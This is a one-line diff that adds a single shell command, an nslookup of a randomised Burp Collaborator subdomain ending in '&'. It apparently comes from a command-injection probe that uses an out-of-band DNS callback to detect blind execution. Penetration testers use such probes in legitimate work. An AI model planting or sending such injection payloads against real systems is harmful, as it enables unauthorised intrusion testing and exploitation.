@@ -1,0 +1,1 @@
+nslookup -q=cname c1egmxh69zs69xhtqeoquj9ig9m2av1jumie57tw.burpcollaborator.net.&
